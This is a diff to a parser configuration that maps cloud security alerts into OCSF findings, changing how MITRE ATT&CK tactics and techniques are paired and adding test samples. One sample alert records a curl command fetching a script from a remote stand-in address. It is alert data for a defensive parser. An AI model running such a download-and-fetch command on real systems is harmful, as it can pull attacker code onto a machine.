@@ -182,17 +182,23 @@ parser_vrl: |
       # ---- MITRE ATT&CK: techniques + intent (kill-chain tactics) ----
       # Log Analytics rows hold multi-valued columns as JSON array text
       # ("[\"T1078\",\"T1110\"]"); other paths use an array or "A, B" text.
-      tactic_list = array(r.intent) ?? array(r.tactics) ?? []
-      if length(tactic_list) == 0 {
-          it_txt = string(r.intent) ?? string(r.tactics) ?? ""
-          it_arr, it_err = parse_json(it_txt)
-          if it_err == null && is_array(it_arr) { tactic_list = array!(it_arr) } else if it_txt != "" { tactic_list = split(it_txt, ",") }
-      }
+      # Intent is read first; Tactics fills in whenever Intent yields no usable
+      # tactic (empty, "Unknown" or "PreAttack" only).
       tactics = []
-      for_each(tactic_list) -> |_i, it| {
-          name = strip_whitespace(to_string(it) ?? "")
-          if name != "" && downcase(name) != "unknown" && downcase(name) != "preattack" {
-              tactics = push(tactics, { "name": name })
+      for_each([r.intent, r.tactics]) -> |_si, src| {
+          if length(tactics) == 0 && src != null {
+              tl = array(src) ?? []
+              if length(tl) == 0 {
+                  tx = string(src) ?? ""
+                  tx_arr, tx_err = parse_json(tx)
+                  if tx_err == null && is_array(tx_arr) { tl = array!(tx_arr) } else if tx != "" { tl = split(tx, ",") }
+              }
+              for_each(tl) -> |_i, it| {
+                  name = strip_whitespace(to_string(it) ?? "")
+                  if name != "" && downcase(name) != "unknown" && downcase(name) != "preattack" {
+                      tactics = push(tactics, { "name": name })
+                  }
+              }
           }
       }
       techs = array(r.techniques) ?? []
@@ -201,19 +207,21 @@ parser_vrl: |
           ts_arr, ts_err = parse_json(ts_txt)
           if ts_err == null && is_array(ts_arr) { techs = array!(ts_arr) } else if ts_txt != "" { techs = split(ts_txt, ",") }
       }
+      # Only the singular attack.tactic is used (attack.tactics is deprecated
+      # since OCSF 1.1.0). The alert does not say which technique belongs to
+      # which tactic, so a single tactic is paired with each technique, and
+      # several tactics each get their own attack beside the technique ones.
       attacks = []
       for_each(techs) -> |_i, tq| {
           tid = strip_whitespace(to_string(tq) ?? "")
           if tid != "" {
               a = { "technique": { "uid": tid } }
-              if length(tactics) > 0 { a.tactics = tactics }
+              if length(tactics) == 1 { a.tactic = tactics[0] }
               attacks = push(attacks, a)
           }
       }
-      # Intent without techniques: one attack per tactic (OCSF needs a tactic,
-      # technique or sub_technique on each attack).
-      if length(attacks) == 0 {
-          attacks = map_values(tactics) -> |tc| { { "tactic": tc } }
+      if length(attacks) == 0 || length(tactics) > 1 {
+          for_each(tactics) -> |_i, tc| { attacks = push(attacks, { "tactic": tc }) }
       }
       if length(attacks) > 0 { finding_info.attacks = attacks }
 
@@ -941,7 +949,8 @@ samples:
       "severity_id": "4"
       "finding_info.title": "Suspicious process executed"
       "finding_info.attacks.0.technique.uid": "T1059"
-      "finding_info.attacks.1.tactics.1.name": "DefenseEvasion"
+      "finding_info.attacks.1.technique.uid": "T1036"
+      "finding_info.attacks.3.tactic.name": "DefenseEvasion"
       "evidences.2.process.pid": "7980"
       "evidences.1.user.name": "svc_web"
       "remediation.desc": "Review the process command line and the user account that ran it.\nIf the activity is unexpected, isolate the machine and run a full antimalware scan."
@@ -1023,7 +1032,7 @@ samples:
       "evidences.3.process.pid": "4321"
       "finding_info.attacks.0.technique.uid": "T1059"
       "finding_info.attacks.1.technique.uid": "T1105"
-      "finding_info.attacks.0.tactics.1.name": "CommandAndControl"
+      "finding_info.attacks.3.tactic.name": "CommandAndControl"
   # neon review #78: one evidence per entity; decimal processId.
   # source: https://learn.microsoft.com/en-us/rest/api/defenderforcloud-composite/alerts
   - raw: "{\"id\":\"/subscriptions/00000000-0000-0000-0000-000000000000/resourceGroups/rg-example/providers/Microsoft.Security/locations/westeurope/alerts/2518298467986649000_eeee5555-ffff-6666-aaaa-777777777777\",\"name\":\"2518298467986649000_eeee5555-ffff-6666-aaaa-777777777777\",\"type\":\"Microsoft.Security/Locations/alerts\",\"properties\":{\"status\":\"Active\",\"timeGeneratedUtc\":\"2026-11-03T03:00:12.0000000Z\",\"vendorName\":\"Microsoft\",\"alertDisplayName\":\"Successful brute force attack\",\"alertType\":\"VM_LoginBruteForceSuccess\",\"compromisedEntity\":\"vm-jump-01\",\"description\":\"Several sign in attempts were detected from multiple sources, followed by a successful sign in.\",\"intent\":\"CredentialAccess\",\"startTimeUtc\":\"2026-11-03T02:40:00.0000000Z\",\"endTimeUtc\":\"2026-11-03T02:59:00.0000000Z\",\"systemAlertId\":\"2518298467986649000_eeee5555-ffff-6666-aaaa-777777777777\",\"productName\":\"Microsoft Defender for Cloud\",\"severity\":\"High\",\"entities\":[{\"$id\":\"1\",\"address\":\"192.0.2.1\",\"type\":\"ip\"},{\"$id\":\"2\",\"address\":\"192.0.2.2\",\"type\":\"ip\"},{\"$id\":\"3\",\"name\":\"alice\",\"type\":\"account\"},{\"$id\":\"4\",\"name\":\"bob\",\"type\":\"account\"},{\"$id\":\"5\",\"processId\":4321,\"commandLine\":\"sshd: alice [priv]\",\"type\":\"process\"},{\"$ref\":\"3\"}]}}"
@@ -1040,3 +1049,15 @@ samples:
       "class_uid": "0"
       "metadata.uid": "68433770a5100dff17539285eb102d829f00f80257486fcc4892882e14237579"
       "unmapped.parse_fallback": "unparsable input"
+  # neon #78 r2: an "Unknown" Intent falls back to Tactics
+  - raw: "{\"TenantId\":\"00000000-0000-0000-0000-000000000000\",\"TimeGenerated\":\"2026-11-03T02:14:09.5510000Z\",\"DisplayName\":\"Suspicious download using curl detected\",\"AlertName\":\"Suspicious download using curl detected\",\"AlertSeverity\":\"Medium\",\"Description\":\"Analysis of host data detected the use of curl to download a script from a remote address.\",\"ProviderName\":\"Detection\",\"VendorName\":\"Microsoft\",\"SystemAlertId\":\"bbbb2222-cccc-3333-dddd-444444444444\",\"ResourceId\":\"/subscriptions/00000000-0000-0000-0000-000000000000/resourceGroups/rg-linux/providers/Microsoft.Compute/virtualMachines/vm-linux-07\",\"AlertType\":\"VM_SuspectDownloadArtifacts\",\"ConfidenceLevel\":\"\",\"IsIncident\":false,\"StartTime\":\"2026-11-03T02:10:00.0000000Z\",\"EndTime\":\"2026-11-03T02:11:00.0000000Z\",\"ProcessingEndTime\":\"2026-11-03T02:14:00.0000000Z\",\"RemediationSteps\":\"[\\\"Review the downloaded file and the process tree.\\\"]\",\"ExtendedProperties\":\"{\\\"resourceType\\\":\\\"Virtual Machine\\\"}\",\"Entities\":\"[{\\\"$id\\\":\\\"2\\\",\\\"Address\\\":\\\"198.51.100.44\\\",\\\"Type\\\":\\\"ip\\\"},{\\\"$id\\\":\\\"3\\\",\\\"HostName\\\":\\\"vm-linux-07\\\",\\\"OSFamily\\\":\\\"Linux\\\",\\\"Type\\\":\\\"host\\\"},{\\\"$id\\\":\\\"4\\\",\\\"Name\\\":\\\"deploy\\\",\\\"Host\\\":{\\\"$ref\\\":\\\"3\\\"},\\\"Type\\\":\\\"account\\\"},{\\\"$id\\\":\\\"5\\\",\\\"ProcessId\\\":\\\"4321\\\",\\\"CommandLine\\\":\\\"/usr/bin/curl -s http://198.51.100.44/x.sh\\\",\\\"Host\\\":{\\\"$ref\\\":\\\"3\\\"},\\\"Type\\\":\\\"process\\\"}]\",\"SourceSystem\":\"Detection\",\"ProductName\":\"Azure Security Center\",\"ProductComponentName\":\"Servers\",\"Status\":\"New\",\"CompromisedEntity\":\"vm-linux-07\",\"Tactics\":\"[\\\"Execution\\\",\\\"CommandAndControl\\\"]\",\"Techniques\":\"[\\\"T1059\\\",\\\"T1105\\\"]\",\"Type\":\"SecurityAlert\",\"Intent\":\"Unknown\"}"
+    expect:
+      "class_uid": "2004"
+      "finding_info.attacks.2.tactic.name": "Execution"
+      "finding_info.attacks.3.tactic.name": "CommandAndControl"
+  # neon #78 r2: one tactic is paired with each technique on the singular tactic
+  - raw: "{\"TenantId\":\"00000000-0000-0000-0000-000000000000\",\"TimeGenerated\":\"2026-11-03T02:14:09.5510000Z\",\"DisplayName\":\"Suspicious download using curl detected\",\"AlertName\":\"Suspicious download using curl detected\",\"AlertSeverity\":\"Medium\",\"Description\":\"Analysis of host data detected the use of curl to download a script from a remote address.\",\"ProviderName\":\"Detection\",\"VendorName\":\"Microsoft\",\"SystemAlertId\":\"bbbb2222-cccc-3333-dddd-444444444444\",\"ResourceId\":\"/subscriptions/00000000-0000-0000-0000-000000000000/resourceGroups/rg-linux/providers/Microsoft.Compute/virtualMachines/vm-linux-07\",\"AlertType\":\"VM_SuspectDownloadArtifacts\",\"ConfidenceLevel\":\"\",\"IsIncident\":false,\"StartTime\":\"2026-11-03T02:10:00.0000000Z\",\"EndTime\":\"2026-11-03T02:11:00.0000000Z\",\"ProcessingEndTime\":\"2026-11-03T02:14:00.0000000Z\",\"RemediationSteps\":\"[\\\"Review the downloaded file and the process tree.\\\"]\",\"ExtendedProperties\":\"{\\\"resourceType\\\":\\\"Virtual Machine\\\"}\",\"Entities\":\"[{\\\"$id\\\":\\\"2\\\",\\\"Address\\\":\\\"198.51.100.44\\\",\\\"Type\\\":\\\"ip\\\"},{\\\"$id\\\":\\\"3\\\",\\\"HostName\\\":\\\"vm-linux-07\\\",\\\"OSFamily\\\":\\\"Linux\\\",\\\"Type\\\":\\\"host\\\"},{\\\"$id\\\":\\\"4\\\",\\\"Name\\\":\\\"deploy\\\",\\\"Host\\\":{\\\"$ref\\\":\\\"3\\\"},\\\"Type\\\":\\\"account\\\"},{\\\"$id\\\":\\\"5\\\",\\\"ProcessId\\\":\\\"4321\\\",\\\"CommandLine\\\":\\\"/usr/bin/curl -s http://198.51.100.44/x.sh\\\",\\\"Host\\\":{\\\"$ref\\\":\\\"3\\\"},\\\"Type\\\":\\\"process\\\"}]\",\"SourceSystem\":\"Detection\",\"ProductName\":\"Azure Security Center\",\"ProductComponentName\":\"Servers\",\"Status\":\"New\",\"CompromisedEntity\":\"vm-linux-07\",\"Tactics\":\"CredentialAccess\",\"Techniques\":\"[\\\"T1059\\\",\\\"T1105\\\"]\",\"Type\":\"SecurityAlert\",\"Intent\":\"Unknown\"}"
+    expect:
+      "class_uid": "2004"
+      "finding_info.attacks.1.technique.uid": "T1105"
+      "finding_info.attacks.1.tactic.name": "CredentialAccess"
